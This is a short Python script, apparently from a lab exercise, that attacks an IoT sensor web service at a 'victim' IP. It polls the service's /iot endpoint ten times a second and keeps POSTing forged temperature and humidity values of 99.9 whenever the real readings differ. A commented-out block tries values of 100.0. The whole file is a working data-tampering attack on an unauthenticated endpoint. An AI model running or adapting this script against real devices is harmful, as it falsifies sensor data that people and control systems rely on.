#!/usr/bin/python3

import requests
import time
import json

vicitmIp = ""
attacker_data = {'temp': '99.9', 'humidity': '99.9'}

while True:
    data = requests.get(f'''http://{vicitmIp}:5000/iot''')
    data_dict = json.loads((data.content).decode('UTF-8'))

    if data_dict != attacker_data:

        urlTemp = f'''http://{vicitmIp}:5000/iot?temperature={99.9}&humidity={99.9}'''
        response = requests.post(urlTemp, verify=False)
        print("Sent")

    time.sleep(0.1)


# try:
#     urlTemp = f'''http://{vicitmIp}:5000/iot?temperature={100.0}&humidity={100.0}'''
#     response = requests.post(urlTemp, verify=False)
#     print(response)
#
# except:
#     print("<Response [404]>")
